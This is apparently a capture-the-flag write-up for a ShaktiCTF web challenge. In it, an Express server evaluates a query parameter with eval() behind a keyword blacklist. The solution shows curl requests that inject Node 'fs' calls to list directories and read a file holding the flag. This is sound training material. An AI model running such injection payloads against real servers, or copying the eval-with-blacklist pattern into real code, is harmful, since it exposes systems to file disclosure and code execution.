## Description  
>It takes many good deeds to build a good reputation, and only one bad
function to lose it. url: http://35.239.219.201:4000/  
Source:
https://ctf.shakticon.com/files/a0fcc3b2e2bd831cb93123757167e6ae/main.js?token=eyJ1c2VyX2lkIjo4MDIsInRlYW1faWQiOjI4MSwiZmlsZV9pZCI6NDN9.YGlnjw.MK0LzBnHiKdfRIo4S0RVENkIefY  
Author: Gopika

## Solution

The app source code is super short:  
```js  
var express = require('express');  
var app = express();

app.get('/', function (req, res) {

 var inp = req.query.text;

 if(inp){  
   const blacklist = ['system', 'child_process', 'exec', 'spawn', 'eval'];

   if(blacklist.map(v=>inp.includes(v)).filter(v=>v).length !== 0){  
     res.send("That function is blocked, sorry XD");  
     return;  
   }

   res.send('Welcome to the world ' + eval(inp));  
   console.log(req.query.text);  
 }else{  
   res.send("Hey aren't you missing something??");  
   return;  
 }  
});

app.listen(4000, function () {  
 console.log('app listening on port 4000!');  
});  
```

There's a blacklist and an `eval()` call. We can use the `fs` package to list
directories, read files etc.  
```  
$ curl
"http://35.239.219.201:4000/?text=require('fs').readdirSync('.').toString()"  
Welcome to the world
.bash_history,.bash_logout,.bashrc,.cache,.gnupg,.local,.pm2,.profile,.ssh,Dockerfile,hosts,main.js,node_modules,package-
lock.json  
```

I looked around for a flag file but couldn't find one. Turns out the flag was
actually stored in the `hosts` file inside the app's current directory
(`/app`) for some reason.  
```  
$ curl
"http://35.239.219.201:4000/?text=require('fs').readFileSync('hosts').toString()"  
Welcome to the world 127.0.0.1  localhost  
::1     localhost ip6-localhost ip6-loopback  
fe00::0 ip6-localnet  
ff00::0 ip6-mcastprefix  
ff02::1 ip6-allnodes  
ff02::2 ip6-allrouters  
172.17.0.2      07e38cb70e8f

# so you found out even if I hid it in not-so common places. one stupid
function and it made all my secrets public.
shaktictf{eval_1s_n0t_safe_f0r_reputation}  
```

Flag is `shaktictf{eval_1s_n0t_safe_f0r_reputation}`